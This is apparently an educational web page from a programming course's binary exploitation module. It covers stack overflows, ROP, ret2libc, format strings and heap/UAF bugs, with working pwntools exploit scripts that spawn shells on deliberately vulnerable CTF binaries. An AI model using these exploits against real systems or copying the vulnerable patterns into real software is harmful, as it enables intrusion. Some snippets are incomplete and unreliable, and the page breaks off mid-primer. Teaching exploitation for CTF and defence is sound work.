@@ -1,0 +1,1235 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Binary Exploitation — Low-Level Academy</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .page-hero {
+      padding: 4rem 0 2.5rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .page-desc {
+      font-size: 0.85rem;
+      color: var(--text-mid);
+      max-width: 560px;
+      line-height: 1.8;
+      margin-top: 0.6rem;
+    }
+
+    .lesson-grid {
+      display: grid;
+      grid-template-columns: 210px 1fr;
+      gap: 2rem;
+      align-items: start;
+      padding: 2rem 0;
+    }
+
+    .toc-sticky {
+      position: sticky;
+      top: 62px;
+      border: 1px solid var(--border);
+      background: var(--bg1);
+      font-family: 'IBM Plex Mono', monospace;
+      max-height: calc(100vh - 80px);
+      overflow-y: auto;
+    }
+
+    .toc-header {
+      padding: 0.5rem 0.9rem;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.6rem;
+      color: var(--text-dim);
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    .toc-sticky a {
+      display: block;
+      padding: 0.3rem 0.9rem;
+      font-size: 0.67rem;
+      color: var(--text-dim);
+      text-decoration: none;
+      border-left: 2px solid transparent;
+      transition: all 0.12s;
+    }
+
+    .toc-sticky a:hover {
+      color: var(--red);
+      border-left-color: var(--red);
+      background: rgba(224, 112, 112, 0.03);
+    }
+
+    @media (max-width: 800px) {
+      .lesson-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .toc-sticky {
+        position: static;
+        max-height: none;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="topnav">
+    <a href="index.html" class="nav-logo">LOW<em>—</em>LEVEL</a>
+    <button class="nav-toggle" aria-label="Menu">☰</button>
+    <a href="basics.html" class="nav-link">Basics</a>
+    <a href="c.html" class="nav-link">C</a>
+    <a href="cpp.html" class="nav-link">C++</a>
+    <a href="asm.html" class="nav-link">ASM</a>
+    <a href="re.html" class="nav-link">RE</a>
+    <a href="bugs.html" class="nav-link active">Bugs</a>
+    <div class="nav-spacer"></div>
+    <div class="nav-badge">Module 06</div>
+  </nav>
+
+  <div class="page">
+    <div class="container">
+      <section class="page-hero">
+        <div class="sec-label">// module 06</div>
+        <h1 class="page-title">Binary <span class="accent" style="color:var(--red)">Exploitation</span></h1>
+        <p class="page-desc">Every class of vulnerability has a root cause rooted in low-level behavior: pointer
+          arithmetic, memory layout, integer semantics, or trust boundaries. This module takes you through stack
+          overflows, format strings, heap corruption, integer bugs, and ROP chains — with working exploit code for each.
+        </p>
+      </section>
+
+      <div class="lesson-grid">
+        <nav class="toc-sticky">
+          <div class="toc-header">// contents</div>
+          <a href="#bug-mitigations">Mitigations Overview</a>
+          <a href="#bug-stack">Stack Buffer Overflow</a>
+          <a href="#bug-ret2win">ret2win</a>
+          <a href="#bug-shellcode">Shellcode Injection</a>
+          <a href="#bug-rop">ROP Chains</a>
+          <a href="#bug-ret2libc">ret2libc</a>
+          <a href="#bug-canary">Stack Canaries</a>
+          <a href="#bug-format">Format String</a>
+          <a href="#bug-integer">Integer Overflow</a>
+          <a href="#bug-heap">Heap Corruption</a>
+          <a href="#bug-uaf">Use-After-Free</a>
+          <a href="#bug-pwntools">pwntools Primer</a>
+          <a href="#bug-challenges">Challenges</a>
+        </nav>
+        <div>
+
+          <div class="card reveal" id="bug-mitigations">
+            <h2 class="sec-title">01 — Mitigations and When They Matter</h2>
+            <div class="divider"></div>
+            <p>Modern binaries ship with several layers of exploit mitigation. Every CTF challenge (and real target) has
+              a specific combination. Knowing what's enabled tells you what techniques are available.</p>
+            <table class="tbl">
+              <tr>
+                <th>Mitigation</th>
+                <th>What it does</th>
+                <th>Bypassed by</th>
+              </tr>
+              <tr>
+                <td class="tc">NX / W^X</td>
+                <td>Stack and heap are not executable — injected shellcode can't run</td>
+                <td>ROP chains, ret2libc (reuse existing code)</td>
+              </tr>
+              <tr>
+                <td class="tc">Stack Canary</td>
+                <td>Random value placed before saved RIP; checked on return</td>
+                <td>Leak the canary, format string read, or avoid overwriting it</td>
+              </tr>
+              <tr>
+                <td class="tc">ASLR</td>
+                <td>OS randomizes base addresses of stack, heap, libraries each run</td>
+                <td>Leak a runtime address, then calculate offsets from it</td>
+              </tr>
+              <tr>
+                <td class="tc">PIE</td>
+                <td>Binary itself loads at random base address (ASLR for the binary)</td>
+                <td>Leak a binary address (e.g., via format string), compute base</td>
+              </tr>
+              <tr>
+                <td class="tc">Full RELRO</td>
+                <td>GOT is read-only; cannot overwrite function pointers there</td>
+                <td>Target other writable memory: hooks, exit handlers, heap</td>
+              </tr>
+              <tr>
+                <td class="tc">Fortify</td>
+                <td>Replaces unsafe libc functions with bounds-checked versions</td>
+                <td>Use the non-fortified version, or find another vector</td>
+              </tr>
+            </table>
+            <pre class="code-block"><span class="tag">checksec output and what it means</span>$ checksec ./vuln
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO       <span class="cmt">← GOT writable → GOT overwrite possible</span>
+    Stack:    No canary found     <span class="cmt">← stack overflow → direct RIP control</span>
+    NX:       NX enabled          <span class="cmt">← no shellcode on stack → need ROP/ret2libc</span>
+    PIE:      No PIE              <span class="cmt">← binary at fixed 0x400000 → no leak needed for gadgets</span>
+
+<span class="cmt"># This specific combination = classic ret2plt / ret2libc CTF binary</span></pre>
+          </div>
+
+          <div class="card reveal" id="bug-stack">
+            <h2 class="sec-title">02 — Stack Buffer Overflow — Root Cause</h2>
+            <div class="divider"></div>
+            <p>C does not perform bounds checking on array or buffer writes. If you write more bytes into a stack buffer
+              than it can hold, the extra bytes overflow into adjacent stack memory — including the saved return
+              address. When the function returns, it jumps to whatever address you wrote there.</p>
+            <pre class="code-block"><span class="tag">the vulnerability</span><span class="kw">#include</span> &lt;stdio.h&gt;
+<span class="kw">#include</span> &lt;string.h&gt;
+
+<span class="kw">void</span> <span class="fn">vuln</span>(<span class="kw">void</span>) {
+    <span class="kw">char</span> buf[<span class="num">64</span>];   <span class="cmt">// 64 bytes on stack</span>
+    gets(buf);      <span class="cmt">// reads UNLIMITED bytes from stdin — NO bounds check</span>
+    printf(<span class="str">"You said: %s\n"</span>, buf);
+}
+
+<span class="kw">int</span> <span class="fn">main</span>(<span class="kw">void</span>) {
+    vuln();
+    <span class="kw">return</span> <span class="num">0</span>;
+}</pre>
+            <pre class="code-block"><span class="tag">stack layout during vuln()</span>High address
+  [RBP + 8]   = return address   ← 72 bytes from buf[0]
+  [RBP + 0]   = saved RBP        ← 64 bytes from buf[0]
+  [RBP - 64]  = buf[0..63]       ← our buffer starts here = RSP
+Low address
+
+Overflow pattern:
+  "A" * 64     → fills buf
+  "A" * 8      → overwrites saved RBP
+  "\x41\x42\x43\x44\x45\x46\x47\x48"  → overwrites return address
+
+On ret: RIP = 0x4847464544434241  (little-endian)</pre>
+            <pre class="code-block"><span class="tag">finding the offset — De Bruijn pattern</span>$ python3 -c "import pwn; print(pwn.cyclic(200))"
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala...
+
+$ echo "aaaabaaacaaad..." | ./vuln
+Segfault at 0x6161616c
+
+$ python3 -c "import pwn; print(pwn.cyclic_find(0x6161616c))"
+72
+<span class="cmt"># → 72 bytes to reach saved return address</span></pre>
+          </div>
+
+          <div class="card reveal" id="bug-ret2win">
+            <h2 class="sec-title">03 — ret2win — The Simplest Exploit</h2>
+            <div class="divider"></div>
+            <p>The simplest stack overflow exploit: the binary contains a "win" function that it never calls normally.
+              You overflow the stack and redirect execution to it.</p>
+            <pre class="code-block"><span class="tag">ret2win vulnerable binary</span><span class="kw">#include</span> &lt;stdio.h&gt;
+<span class="kw">#include</span> &lt;string.h&gt;
+
+<span class="kw">void</span> <span class="fn">win</span>(<span class="kw">void</span>) {         <span class="cmt">// never called normally</span>
+    puts(<span class="str">"You got a shell!"</span>);
+    system(<span class="str">"/bin/sh"</span>);
+}
+
+<span class="kw">void</span> <span class="fn">vuln</span>(<span class="kw">void</span>) {
+    <span class="kw">char</span> buf[<span class="num">64</span>];
+    gets(buf);
+}
+
+<span class="kw">int</span> <span class="fn">main</span>(<span class="kw">void</span>) {
+    vuln();
+    <span class="kw">return</span> <span class="num">0</span>;
+}</pre>
+            <pre class="code-block"><span class="tag">exploit with pwntools</span><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+elf = ELF(<span class="str">'./vuln'</span>)
+p   = process(<span class="str">'./vuln'</span>)
+
+win_addr = elf.symbols[<span class="str">'win'</span>]  <span class="cmt"># 0x401136 — fixed (no PIE)</span>
+print(<span class="str">f"win() is at: {hex(win_addr)}"</span>)
+
+offset = <span class="num">72</span>   <span class="cmt"># bytes to reach return address (found with cyclic)</span>
+
+payload  = b<span class="str">"A"</span> * offset         <span class="cmt"># fill buffer + saved RBP</span>
+payload += p64(win_addr)           <span class="cmt"># overwrite return address → win()</span>
+
+p.sendline(payload)
+p.interactive()   <span class="cmt"># drop into shell</span></pre>
+            <div class="note warn"><b>// x64 stack alignment</b>On x86-64, some functions (especially those using SSE
+              instructions like <code>system()</code>) require the stack to be 16-byte aligned before the call. If your
+              exploit crashes inside <code>system()</code>, add a <code>ret</code> gadget before win's address to fix
+              alignment. Find one with: <code>ROPgadget --binary ./vuln | grep ": ret"</code></div>
+          </div>
+
+          <div class="card reveal" id="bug-shellcode">
+            <h2 class="sec-title">04 — Shellcode Injection (NX disabled)</h2>
+            <div class="divider"></div>
+            <p>When NX is disabled, the stack is executable. You can inject raw machine code into the buffer and
+              redirect execution to it. This technique is now rare in modern binaries, but essential to understand
+              conceptually.</p>
+            <pre class="code-block"><span class="tag">shellcode — execve("/bin/sh")</span><span class="cmt">; x86-64 Linux execve("/bin/sh", NULL, NULL)</span>
+<span class="cmt">; 27 bytes — classic shellcode</span>
+xor    rdi, rdi
+push   rdi              <span class="cmt">; null terminator for "/bin/sh"</span>
+mov    rbx, 0x68732f6e69622f   <span class="cmt">; "/bin/sh" (reversed, little-endian)</span>
+push   rbx
+mov    rdi, rsp         <span class="cmt">; rdi = pointer to "/bin/sh\0"</span>
+xor    rsi, rsi         <span class="cmt">; argv = NULL</span>
+xor    rdx, rdx         <span class="cmt">; envp = NULL</span>
+mov    rax, 59          <span class="cmt">; syscall 59 = execve</span>
+syscall</pre>
+            <pre class="code-block"><span class="tag">exploit: inject shellcode + redirect to stack</span><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cmt"># Compile without NX: gcc -z execstack -fno-stack-protector vuln.c</span>
+
+p = process(<span class="str">'./vuln'</span>)
+
+shellcode = asm(shellcraft.sh())   <span class="cmt"># pwntools generates shellcode</span>
+print(<span class="str">f"shellcode: {len(shellcode)} bytes"</span>)
+
+<span class="cmt"># Find stack address via GDB: break at gets, x/gx $rsp</span>
+buf_addr = <span class="num">0x7fffffffe240</span>   <span class="cmt"># address of buf[] on the stack</span>
+offset   = <span class="num">72</span>
+
+payload  = shellcode            <span class="cmt"># shellcode at start of buffer</span>
+payload += b<span class="str">"A"</span> * (offset - len(shellcode))  <span class="cmt"># pad to offset</span>
+payload += p64(buf_addr)        <span class="cmt"># return address → buf (where shellcode is)</span>
+
+p.sendline(payload)
+p.interactive()</pre>
+            <div class="note info"><b>// why ASLR kills this</b>The stack address changes every run with ASLR. Without
+              knowing the exact address of your shellcode, you can't jump to it reliably. Solutions: a memory leak that
+              gives you a stack address, NOP sleds (huge nop sequences before shellcode), or pivot to a non-ASLR
+              location.</div>
+          </div>
+
+          <div class="card reveal" id="bug-rop">
+            <h2 class="sec-title">05 — ROP — Return Oriented Programming</h2>
+            <div class="divider"></div>
+            <p>NX makes the stack non-executable — injected shellcode can't run. ROP bypasses this by chaining together
+              small existing code snippets that each end in <code>ret</code>. These are called <strong>gadgets</strong>.
+              By overwriting the stack with a series of gadget addresses, you build a "program" out of existing code.
+            </p>
+            <pre class="code-block"><span class="tag">ROP fundamentals</span><span class="cmt">; A gadget is any sequence of instructions ending in ret:</span>
+0x401234: pop rdi ; ret    <span class="cmt">← "pop rdi gadget"</span>
+0x401245: pop rsi ; ret
+0x401256: pop rdx ; ret
+
+<span class="cmt">; Each time ret runs, it pops the NEXT value off the stack into RIP</span>
+<span class="cmt">; So the stack becomes a "program" of gadget addresses + data</span>
+
+<span class="cmt">; Example: call write(1, 0x402010, 8) via ROP</span>
+<span class="cmt">;   → need: rdi=1, rsi=0x402010, rdx=8, then call write</span>
+
+Stack layout (after overflow):
+  [offset + 0]  = addr of "pop rdi ; ret"     ← gadget 1
+  [offset + 8]  = 0x1                          ← value for rdi (fd=stdout)
+  [offset + 16] = addr of "pop rsi ; ret"     ← gadget 2
+  [offset + 24] = 0x402010                    ← address to print
+  [offset + 32] = addr of "pop rdx ; ret"     ← gadget 3
+  [offset + 40] = 0x8                         ← length
+  [offset + 48] = addr of write@plt           ← call write()</pre>
+            <pre class="code-block"><span class="tag">finding gadgets</span>$ ROPgadget --binary ./vuln --rop
+$ ropper -f ./vuln
+$ python3 -c "from pwn import *; elf=ELF('./vuln'); print(hex(next(elf.search(asm('pop rdi; ret')))))"
+
+<span class="cmt"># In pwntools:</span>
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]</pre>
+          </div>
+
+          <div class="card reveal" id="bug-ret2libc">
+            <h2 class="sec-title">06 — ret2libc — Calling system("/bin/sh")</h2>
+            <div class="divider"></div>
+            <p>The most common CTF exploit: chain gadgets to call <code>system("/bin/sh")</code> from libc. You need the
+              addresses of <code>system()</code> and the string <code>"/bin/sh"</code> in libc. With ASLR, you must
+              first leak a libc address to calculate them.</p>
+            <pre class="code-block"><span class="tag">ret2libc exploit (no ASLR / known libc base)</span><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+elf  = ELF(<span class="str">'./vuln'</span>)
+libc = ELF(<span class="str">'./libc.so.6'</span>)   <span class="cmt"># libc that the binary uses</span>
+
+<span class="cmt"># If no ASLR (or after leak), we know libc base</span>
+libc.address = <span class="num">0x7ffff7a00000</span>  <span class="cmt"># set base address</span>
+
+system_addr  = libc.symbols[<span class="str">'system'</span>]
+binsh_addr   = next(libc.search(<span class="str">b'/bin/sh\x00'</span>))
+pop_rdi      = rop.find_gadget([<span class="str">'pop rdi'</span>, <span class="str">'ret'</span>])[0]
+ret_gadget   = rop.find_gadget([<span class="str">'ret'</span>])[0]   <span class="cmt"># for stack alignment</span>
+
+offset = <span class="num">72</span>
+payload  = b<span class="str">"A"</span> * offset
+payload += p64(pop_rdi)    <span class="cmt"># gadget: pop rdi; ret</span>
+payload += p64(binsh_addr) <span class="cmt"># → rdi = "/bin/sh"</span>
+payload += p64(ret_gadget) <span class="cmt"># align stack (system() needs 16-byte alignment)</span>
+payload += p64(system_addr)<span class="cmt"># call system("/bin/sh")</span>
+
+p = process(<span class="str">'./vuln'</span>)
+p.sendline(payload)
+p.interactive()</pre>
+            <pre class="code-block"><span class="tag">leaking a libc address (defeating ASLR)</span><span class="cmt"># 1. Call puts(puts@got) — this prints the runtime address of puts in libc</span>
+<span class="cmt"># 2. From that address, compute libc base: base = leaked - libc.sym.puts</span>
+<span class="cmt"># 3. Then compute system() and /bin/sh addresses</span>
+
+payload1  = b<span class="str">"A"</span> * offset
+payload1 += p64(pop_rdi)
+payload1 += p64(elf.got[<span class="str">'puts'</span>])   <span class="cmt"># arg: address of GOT entry for puts</span>
+payload1 += p64(elf.plt[<span class="str">'puts'</span>])   <span class="cmt"># call puts() to print that address</span>
+payload1 += p64(elf.symbols[<span class="str">'main'</span>]) <span class="cmt"># return to main to exploit again</span>
+
+p.sendline(payload1)
+leaked = u64(p.recvline().strip().ljust(<span class="num">8</span>, <span class="str">b'\x00'</span>))
+libc.address = leaked - libc.symbols[<span class="str">'puts'</span>]
+print(<span class="str">f"libc base: {hex(libc.address)}"</span>)
+<span class="cmt"># Now send second payload with correct addresses...</span></pre>
+          </div>
+
+          <div class="card reveal" id="bug-canary">
+            <h2 class="sec-title">07 — Stack Canaries — Detection and Bypass</h2>
+            <div class="divider"></div>
+            <p>A stack canary is a random 8-byte value placed between the local variables and the saved return address.
+              Before returning, the function checks that it hasn't changed. Overflowing the buffer overwrites the canary
+              — which triggers <code>__stack_chk_fail()</code> before the exploit can run.</p>
+            <pre class="code-block"><span class="tag">canary in memory</span>Stack layout with canary enabled:
+  [RBP + 8]   = return address
+  [RBP + 0]   = saved RBP
+  [RBP - 8]   = CANARY (random, e.g. 0x2a7fce1b00b4d300)
+  [RBP - 72]  = char buf[64]    ← overflow starts here
+
+<span class="cmt">; In assembly (function epilogue):</span>
+mov    rax, QWORD PTR [rbp-0x8]   <span class="cmt">; load our saved canary</span>
+xor    rax, QWORD PTR fs:0x28     <span class="cmt">; XOR with original in TLS</span>
+je     .ok                         <span class="cmt">; if equal: no corruption, return</span>
+call   __stack_chk_fail            <span class="cmt">; if changed: abort</span></pre>
+            <pre class="code-block"><span class="tag">canary bypass — format string leak</span><span class="cmt"># If the program also has a format string bug, we can read the canary:</span>
+<span class="cmt"># printf(user_input) → %p %p %p reads values off the stack</span>
+<span class="cmt"># Canary is always on the stack; find it with positional format strings</span>
+
+<span class="kw">from</span> pwn <span class="kw">import</span> *
+p = process(<span class="str">'./vuln'</span>)
+
+<span class="cmt"># Probe: send positional format strings, look for the canary</span>
+<span class="cmt"># Canary always ends in \x00 (null byte, low byte is always 0)</span>
+<span class="kw">for</span> i <span class="kw">in</span> range(<span class="num">1</span>, <span class="num">50</span>):
+    p.sendline(<span class="str">f"%{i}$p"</span>.encode())
+    val = p.recvline().strip()
+    <span class="kw">if</span> val.endswith(<span class="str">b"00"</span>):   <span class="cmt"># ends in 00 = likely canary</span>
+        print(<span class="str">f"Canary at position {i}: {val}"</span>)
+
+<span class="cmt"># Once we have position (e.g., 15):</span>
+p.sendline(<span class="str">b"%15$p"</span>)
+canary = int(p.recvline().strip(), <span class="num">16</span>)
+
+<span class="cmt"># Now overflow: fill buf, put real canary back, then overwrite RIP</span>
+payload  = b<span class="str">"A"</span> * <span class="num">64</span>       <span class="cmt"># fill buf</span>
+payload += p64(canary)      <span class="cmt"># restore canary — check passes!</span>
+payload += p64(<span class="num">0</span>)           <span class="cmt"># saved RBP (dummy)</span>
+payload += p64(win_addr)    <span class="cmt"># overwrite return address</span></pre>
+          </div>
+
+          <div class="card reveal" id="bug-format">
+            <h2 class="sec-title">08 — Format String Vulnerabilities</h2>
+            <div class="divider"></div>
+            <p>When user input is passed directly to <code>printf</code> as the format string, the attacker controls the
+              format specifiers. This allows reading arbitrary stack memory (<code>%p</code>), reading arbitrary
+              addresses (<code>%s</code>), and <strong>writing arbitrary values</strong> to arbitrary addresses
+              (<code>%n</code>).</p>
+            <pre class="code-block"><span class="tag">the vulnerability</span><span class="cmt">// SAFE:</span>
+printf(<span class="str">"%s"</span>, user_input);    <span class="cmt">// format string is fixed</span>
+
+<span class="cmt">// VULNERABLE:</span>
+printf(user_input);           <span class="cmt">// user controls format string</span>
+<span class="cmt">// If user sends "%p %p %p %p", printf interprets stack as args</span></pre>
+            <pre class="code-block"><span class="tag">reading memory</span><span class="cmt"># %p: print pointer from stack (8 bytes at a time)</span>
+Input: "%p %p %p %p %p %p %p"
+Output: 0x7ffd... 0x401 0x0 0x7ffd... 0x2a7fce1b00b4d300 ...
+                                              ↑ that's the canary!
+
+<span class="cmt"># Positional: read any argument by index</span>
+Input: "%7$p"
+Output: 0x2a7fce1b00b4d300   <span class="cmt">← 7th "argument" (stack slot 7)</span>
+
+<span class="cmt"># %s: dereference and read as string</span>
+<span class="cmt"># If we put an address in the input buffer, we can read from that address:</span>
+Input: \x10\x20\x60\x00\x00\x00\x00\x00%6$s   <span class="cmt">← address at position 6, read as string</span>
+<span class="cmt">→ prints the string stored at 0x602010 (GOT entry!)</span></pre>
+            <pre class="code-block"><span class="tag">writing memory — %n</span><span class="cmt"># %n writes the COUNT of characters printed so far to the pointer argument</span>
+<span class="cmt"># This is how format string gives you arbitrary write:</span>
+
+<span class="cmt"># Write 42 to address 0x602018 (a GOT entry):</span>
+Input: [addr_bytes][padding to 42 chars]%7$n
+<span class="cmt">       ↑ addr at position 7             ↑ writes 42 to *0x602018</span>
+
+<span class="cmt"># Writing a full 8-byte address is done in pieces (hn = 2 bytes, hhn = 1 byte)</span>
+<span class="cmt"># pwntools fmtstr_payload() automates this:</span>
+
+<span class="kw">from</span> pwn <span class="kw">import</span> *
+<span class="cmt"># Overwrite GOT entry for exit() with address of win()</span>
+payload = fmtstr_payload(
+    offset=<span class="num">6</span>,                    <span class="cmt"># stack position of our buffer</span>
+    writes={elf.got[<span class="str">'exit'</span>]: win_addr},   <span class="cmt"># what to write where</span>
+    write_size=<span class="str">'short'</span>          <span class="cmt"># write 2 bytes at a time</span>
+)
+p.sendline(payload)</pre>
+          </div>
+
+          <div class="card reveal" id="bug-integer">
+            <h2 class="sec-title">09 — Integer Overflow Vulnerabilities</h2>
+            <div class="divider"></div>
+            <p>Integer overflow happens silently in C when arithmetic exceeds the type's range. The result wraps around.
+              This causes security bugs when the overflowed value is used for a memory allocation size or as an array
+              index.</p>
+            <pre class="code-block"><span class="tag">signed and unsigned overflow patterns</span><span class="kw">#include</span> &lt;stdint.h&gt;
+
+<span class="cmt">// Type ranges:</span>
+<span class="cmt">// uint8_t:  0 to 255 (wraps: 255+1 = 0)</span>
+<span class="cmt">// int8_t:  -128 to 127 (wraps: 127+1 = -128)</span>
+<span class="cmt">// uint32_t: 0 to 4294967295 (wraps: UINT32_MAX+1 = 0)</span>
+<span class="cmt">// int32_t: -2147483648 to 2147483647</span>
+
+<span class="cmt">// Bug 1: allocation size overflow</span>
+<span class="kw">void</span>* make_buffer(<span class="kw">uint32_t</span> count, <span class="kw">uint32_t</span> size) {
+    <span class="kw">uint32_t</span> total = count * size;   <span class="cmt">// OVERFLOW if count*size > UINT32_MAX</span>
+    <span class="kw">return</span> malloc(total);            <span class="cmt">// allocates tiny buffer</span>
+    <span class="cmt">// then caller writes count*size bytes → heap overflow!</span>
+}
+<span class="cmt">// Attack: count=0x40000001, size=4 → total = 4 (wraps!)</span>
+
+<span class="cmt">// Bug 2: signed comparison bypass</span>
+<span class="kw">void</span> copy_data(<span class="kw">char</span> *dst, <span class="kw">char</span> *src, <span class="kw">int</span> len) {
+    <span class="kw">if</span> (len > <span class="num">1024</span>) <span class="kw">return</span>;   <span class="cmt">// "bounds check"</span>
+    memcpy(dst, src, len);      <span class="cmt">// BUG: len is signed</span>
+    <span class="cmt">// memcpy(dst, src, -1) treats -1 as SIZE_MAX (unsigned)</span>
+    <span class="cmt">// Attack: send len = -1 (0xFFFFFFFF) → passes check, copies HUGE amount</span>
+}
+
+<span class="cmt">// Bug 3: off-by-one → OOB write</span>
+<span class="kw">void</span> fill(<span class="kw">char</span> *buf, <span class="kw">int</span> n) {
+    <span class="kw">for</span> (<span class="kw">int</span> i = <span class="num">0</span>; i &lt;= n; i++)   <span class="cmt">// BUG: should be i < n</span>
+        buf[i] = <span class="str">'A'</span>;               <span class="cmt">// writes buf[n] — one past end</span>
+}</pre>
+            <pre class="code-block"><span class="tag">detection and safe patterns</span><span class="cmt">// Safe multiplication with overflow check:</span>
+<span class="kw">if</span> (count != <span class="num">0</span> &amp;&amp; size > SIZE_MAX / count) {
+    <span class="cmt">// overflow would occur</span>
+    <span class="kw">return</span> NULL;
+}
+<span class="kw">size_t</span> total = (<span class="kw">size_t</span>)count * size;
+
+<span class="cmt">// Use unsigned types for sizes — avoid signed/unsigned mixing</span>
+<span class="cmt">// Use size_t for sizes, not int or uint32_t</span>
+<span class="cmt">// Use __builtin_mul_overflow() in GCC for checked arithmetic</span>
+<span class="kw">size_t</span> total;
+<span class="kw">if</span> (__builtin_mul_overflow(count, size, &amp;total)) abort();</pre>
+          </div>
+
+          <div class="card reveal" id="bug-heap">
+            <h2 class="sec-title">10 — Heap Corruption</h2>
+            <div class="divider"></div>
+            <p>The heap is managed by the allocator (glibc's ptmalloc2). Heap chunks store metadata — size, flags,
+              prev/next pointers — adjacent to user data. Overflowing a heap buffer corrupts that metadata, which the
+              allocator reads on the next malloc/free, enabling control over execution.</p>
+            <pre class="code-block"><span class="tag">heap chunk layout</span>A malloc chunk in memory (simplified):
+  +------------------+
+  | prev_size (8B)  |   ← size of PREVIOUS chunk (if free)
+  | size + flags(8B)|   ← this chunk's size | PREV_INUSE | IS_MMAPPED
+  +------------------+  ← user pointer returned by malloc() points here
+  | user data...    |
+  |                 |
+  +------------------+
+  | next chunk...   |
+
+Flags packed into low 3 bits of size field:
+  bit 0: PREV_INUSE — previous chunk is allocated (not free)
+  bit 1: IS_MMAPPED — chunk was mmap'd
+  bit 2: NON_MAIN_ARENA
+
+<span class="cmt"># Heap overflow: writing past your allocation corrupts the next chunk's header</span>
+<span class="cmt"># When that chunk is freed, the allocator reads the corrupted metadata</span>
+<span class="cmt"># → write-what-where primitive</span></pre>
+            <pre class="code-block"><span class="tag">heap overflow example</span><span class="kw">#include</span> &lt;stdlib.h&gt;
+<span class="kw">#include</span> &lt;string.h&gt;
+
+<span class="kw">typedef struct</span> {
+    <span class="kw">char</span> name[<span class="num">32</span>];
+    <span class="kw">void</span> (*on_exit)(<span class="kw">void</span>);  <span class="cmt">// function pointer</span>
+} Item;
+
+<span class="kw">void</span> hack() { system(<span class="str">"/bin/sh"</span>); }
+
+<span class="kw">int</span> main() {
+    <span class="kw">char</span> *buf  = malloc(<span class="num">32</span>);  <span class="cmt">// allocated first</span>
+    Item *item = malloc(<span class="kw">sizeof</span>(Item));  <span class="cmt">// allocated second — adjacent on heap</span>
+    item->on_exit = NULL;
+
+    <span class="cmt">// Vulnerable: reads 64 bytes into 32-byte buf</span>
+    <span class="cmt">// Overflows into item's memory, overwriting on_exit</span>
+    memcpy(buf, user_data, <span class="num">64</span>);   <span class="cmt">// BUG</span>
+
+    <span class="cmt">// payload: 32 bytes of junk, then address of hack()</span>
+    <span class="cmt">// → item->on_exit = &hack</span>
+
+    <span class="kw">if</span> (item->on_exit) item->on_exit();  <span class="cmt">// calls hack()!</span>
+}</pre>
+          </div>
+
+          <div class="card reveal" id="bug-uaf">
+            <h2 class="sec-title">11 — Use-After-Free</h2>
+            <div class="divider"></div>
+            <p>Use-after-free (UAF) happens when memory is freed but the program continues to use the old pointer. If
+              new allocations reuse that memory, the attacker can control what the freed pointer now points to — most
+              critically, function pointers and vtable pointers.</p>
+            <pre class="code-block"><span class="tag">UAF pattern</span><span class="kw">#include</span> &lt;stdlib.h&gt;
+<span class="kw">#include</span> &lt;string.h&gt;
+<span class="kw">#include</span> &lt;stdio.h&gt;
+
+<span class="kw">typedef struct</span> {
+    <span class="kw">void</span> (*print)(<span class="kw">const char</span>*);  <span class="cmt">// function pointer at offset 0</span>
+    <span class="kw">char</span> name[<span class="num">32</span>];
+} Object;
+
+<span class="kw">void</span> safe_print(<span class="kw">const char</span> *s) { printf(<span class="str">"[safe] %s\n"</span>, s); }
+<span class="kw">void</span> exploit()                  { system(<span class="str">"/bin/sh"</span>); }
+
+<span class="kw">int</span> main() {
+    Object *obj = malloc(<span class="kw">sizeof</span>(Object));
+    obj->print = safe_print;
+    strcpy(obj->name, <span class="str">"hello"</span>);
+
+    free(obj);   <span class="cmt">// freed — but obj pointer still valid in our code!</span>
+
+    <span class="cmt">// Allocate same-size chunk — allocator may return the same memory</span>
+    <span class="kw">char</span> *evil = malloc(<span class="kw">sizeof</span>(Object));
+    <span class="cmt">// write address of exploit() at offset 0 (where print ptr was)</span>
+    *(<span class="kw">void</span>**)evil = exploit;
+
+    <span class="cmt">// UAF: obj->print() reads from freed (now evil) memory</span>
+    obj->print(obj->name);   <span class="cmt">// → calls exploit()!</span>
+}</pre>
+            <div class="note danger"><b>// UAF in C++</b>UAF is especially dangerous in C++ because objects store vtable
+              pointers at offset 0. Freeing an object and getting a new allocation at the same address lets you replace
+              the vtable pointer with a fake vtable — controlling all virtual dispatch. This was one of the most common
+              browser exploit primitives for years.</div>
+          </div>
+
+          <div class="card reveal" id="bug-pwntools">
+            <h2 class="sec-title">12 — pwntools Primer</h2>
+            <div class="divider"></div>
+            <pre class="code-block"><span class="tag">pwntools — the exploit framework</span><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cmt"># Setup</span>
+context.arch     = <span class="str">'amd64'</span>
+context.os       = <span class="str">'linux'</span>
+context.log_level = <span class="str">'info'</span>   <span class="cmt"># or 'debug' to see all IO</span>
+
+<span class="cmt"># Launch processes</span>
+p = process(<span class="str">'./vuln'</span>)           <span class="cmt"># local process</span>
+p = remote(<span class="str">'chal.ctf.com'</span>, <span class="num">1337</span>) <span class="cmt"># remote TCP</span>
+p = gdb.debug(<span class="str">'./vuln'</span>, <span class="str">'break main'</span>)  <span class="cmt"># launch under GDB</span>
+
+<span class="cmt"># ELF and library loading</span>
+elf  = ELF(<span class="str">'./vuln'</span>)
+libc = ELF(<span class="str">'./libc.so.6'</span>)
+elf.address  = <span class="num">0x400000</span>   <span class="cmt"># set base (if PIE and you leaked it)</span>
+libc.address = leaked_base
+
+<span class="cmt"># Symbols, got, plt</span>
+win_addr     = elf.symbols[<span class="str">'win'</span>]
+printf_plt   = elf.plt[<span class="str">'printf'</span>]
+printf_got   = elf.got[<span class="str">'printf'</span>]
+system_addr  = libc.symbols[<span class="str">'system'</span>]
+binsh_addr   = next(libc.search(<span class="str">b'/bin/sh\x00'</span>))
+
+<span class="cmt"># ROP</span>
+rop = ROP(elf)
+pop_rdi = rop.find_gadget([<span class="str">'pop rdi'</span>, <span class="str">'ret'</span>])[0]
